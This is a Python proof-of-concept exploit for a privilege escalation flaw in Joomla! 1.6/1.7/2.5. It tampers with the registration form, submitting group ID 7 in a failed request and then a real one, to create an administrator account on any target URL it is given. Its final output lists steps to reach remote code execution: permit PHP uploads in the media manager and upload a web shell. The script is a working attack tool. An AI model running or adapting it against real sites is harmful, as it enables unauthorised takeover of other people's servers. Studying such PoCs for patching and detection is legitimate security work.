#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : pe.py
# Author             : Podalirius (@podalirius_)
# Date created       : 5 Oct 2022


import argparse
import requests
from bs4 import BeautifulSoup
import re
import random


def gen_random_name(length=8):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    name = ""
    for k in range(length):
        name += random.choice(alphabet)
    return name


def failed_account_creation(session, target:str, username:str, password:str, email="e@e.com", verbose=False):
    print("   [>] Purposely failing account creation for user '%s' ..." % username)

    baselink = target + "/index.php/connexion?view=registration"
    r = session.get(baselink, verify=False)
    id_security = re.search('<input type="hidden" name="([0-9a-f]{32})" value="1" />', r.content.decode('UTF-8')).group(1)
    if verbose == True:
        print("      [>] Security token :", id_security)

    data = {
        'jform[name]': 'Admin : '+username,
        'jform[username]': username,
        'jform[password1]': password,
        'jform[password2]': password+'_', # Deliberately have two different passwords
        'jform[email1]': email,
        'jform[email2]': email,
        'option': 'com_users',
        'task': 'registration.register',
        id_security: 1,
        'jform[groups][]': 7 # Add this to create admin account (It's the exploit)
    }

    r = session.post(url=baselink, data=data, verify=False)
    if b"system-message-container" in r.content:
        soup = BeautifulSoup(r.content,'lxml')
        div = soup.find('div',attrs={'id':'system-message-container'})
        li = div.find('li')
        if any(lang in li.text for lang in ["Les mots de passe que vous avez saisis ne correspondent pas."]):
            print("      [+] Password mismatch (this is expected)!")
            return True, r
        else:
            print("      [-] Error :", li.text)
            return False, r


def real_account_creation(session, target:str, failed_req, username:str, password:str, email="e@e.com", verbose=True):
    print("   [+] Really creating account for user '%s' ..." % username)

    baselink = target + "/index.php/connexion?view=registration"
    id_security = re.search('<input type="hidden" name="([0-9a-f]{32})" value="1" />', failed_req.content.decode('UTF-8')).group(1)
    if verbose == True:
        print("      [>] Security token :", id_security)

    data = {
        'jform[name]': 'Admin : '+username,
        'jform[username]': username,
        'jform[password1]': password,
        'jform[password2]': password,
        'jform[email1]': email,
        'jform[email2]': email,
        'option': 'com_users',
        'task': 'registration.register',
        id_security: 1,
        'jform[groups][]': 7 # Keep this to create admin account
    }
    r = session.post(url=baselink, data=data, verify=False)

    if b"system-message-container" in r.content:
        soup = BeautifulSoup(r.content,'lxml')
        div = soup.find('div',attrs={'id':'system-message-container'})
        li = div.find('li')
        if any(lang in li.text for lang in ["Merci de vous être enregistré"]):
            print("      [+] Account successfully created !")
            return True
        else:
            print("      [-] Error :", li.text)
            return False
    return False


def parseArgs():
    print("PoC for Joomla! 1.6/1.7/2.5 - Privilege Escalation Vulnerability - by @podalirius_\n")

    parser = argparse.ArgumentParser(description="PoC for Joomla! 1.6/1.7/2.5 - Privilege Escalation Vulnerability - by @podalirius_")
    parser.add_argument("-t", "--target", default=None, required=True, help="URL to Joomla account creation page.")
    parser.add_argument("-u", "--username", default=None, required=False, help="Username of the account to create.")
    parser.add_argument("-e", "--email", default=None, required=False, help="Email of the account to create.")
    parser.add_argument("-p", "--password", default=None, required=False, help="Password of the account to create.")
    parser.add_argument("-k", "--insecure", dest="insecure_tls", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    if options.insecure_tls:
        # Disable warnings of insecure connection for invalid certificates
        requests.packages.urllib3.disable_warnings()
        # Allow use of deprecated and weak cipher methods
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass

    if any(value is None for value in [options.username, options.password, options.email]):
        print("[>] Generating random values")
        if options.username is None:
            options.username = gen_random_name(10)
            print("   [>] Username not supplied, using random username : %s" % options.username)

        if options.email is None:
            options.email = '%s.%s@%s.com' % (gen_random_name(10).lower(), gen_random_name(10).lower(), gen_random_name(10).lower())
            print("   [>] Email not supplied, using random email       : %s" % options.email)

        if options.password is None:
            options.password = gen_random_name(10)
            print("   [>] Password not supplied, using random password : %s" % options.password)

    options.target = options.target.rstrip("/")
    if not options.target.startswith("http://") and not options.target.startswith("https://"):
        options.target = "https://" + options.target
    options.target = options.target + '/'

    session = requests.Session()
    try:
        print("\n[>] Starting exploit")
        session.get(options.target)
        result, failed_req = failed_account_creation(
            session=session,
            target=options.target,
            username=options.username,
            password=options.password,
            email=options.email,
            verbose=options.verbose
        )
        real_account_creation(
            session=session,
            target=options.target,
            failed_req=failed_req,
            username=options.username,
            password=options.password,
            email=options.email,
            verbose=options.verbose
        )

    except requests.exceptions.ConnectionError as e:
        print("[warn] Connection Refused.")
    except KeyboardInterrupt as e:
        print("", end="\r")
    except Exception as e:
        raise e
    else:
        print("\n[+] You can connect to your new account:")
        print("  | username :", options.username)
        print("  | password :", options.password)
        print("  | email    :", options.email)
        print("")
        print("[+] To achieve Remote Code Execution (RCE):")
        print("  | 1. Login with the '%s' account on the admin panel:" % options.username, options.target + "/administrator/index.php")
        print("  | 2. Go to the media page:", options.target + "/administrator/index.php?option=com_media")
        print("  |    2.1. Click on parameters on the top right of the page.")
        print("  |    2.2. Add .PHP in the list of allowed extensions.")
        print("  |    2.3. Upload your shell on the media page.")
        print("  | 3. Access your shell and enjoy.")
        print("")
        print("[+] Exploit finished.")
